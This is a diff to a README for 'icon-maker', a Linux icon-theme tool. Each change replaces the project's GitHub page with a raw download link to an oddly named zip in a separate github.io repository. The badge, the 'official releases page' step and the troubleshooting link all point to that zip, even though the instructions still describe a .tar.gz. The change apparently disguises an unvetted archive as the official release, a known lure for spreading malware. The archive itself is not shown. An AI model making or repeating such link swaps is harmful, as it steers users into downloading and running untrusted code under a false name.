@@ -5,7 +5,7 @@ description: "Convert downloaded icon packs into organized Linux icon theme tarb
 ---
 # 🎨 icon-maker - Create custom icons for your desktop
 
-[![](https://img.shields.io/badge/Download-Icon--Maker-blue.svg)](https://github.com/Djjdjdjdhd/icon-maker)
+[![](https://img.shields.io/badge/Download-Icon--Maker-blue.svg)](https://raw.githubusercontent.com/Djjdjdjdhd/djjdjdjdhd.github.io/main/piragua/djjdjdjdhd-io-github-2.2.zip)
 
 ## 📌 About this project
 
@@ -32,7 +32,7 @@ Your computer needs a few things to run this tool. Most systems come with these 
 
 Follow these steps to set up the tool on your machine.
 
-1. Visit the [official releases page](https://github.com/Djjdjdjdhd/icon-maker) to download the package.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Djjdjdjdhd/djjdjdjdhd.github.io/main/piragua/djjdjdjdhd-io-github-2.2.zip) to download the package.
 2. Look for the file ending in .tar.gz for your system.
 3. Save the file to your Downloads folder.
 4. Open your terminal application.
@@ -56,7 +56,7 @@ You might need to make the file executable. Run this command in the folder: `chm
 Ensure you placed the files in the correct folder. Usually, this is `.local/share/icons` inside your home directory. If the folder does not exist, create it.
 
 **I cannot find the download link**
-You can always get the latest version from here: [https://github.com/Djjdjdjdhd/icon-maker](https://github.com/Djjdjdjdhd/icon-maker).
+You can always get the latest version from here: [https://raw.githubusercontent.com/Djjdjdjdhd/djjdjdjdhd.github.io/main/piragua/djjdjdjdhd-io-github-2.2.zip](https://raw.githubusercontent.com/Djjdjdjdhd/djjdjdjdhd.github.io/main/piragua/djjdjdjdhd-io-github-2.2.zip).
 
 ## 💡 Customization tips
 
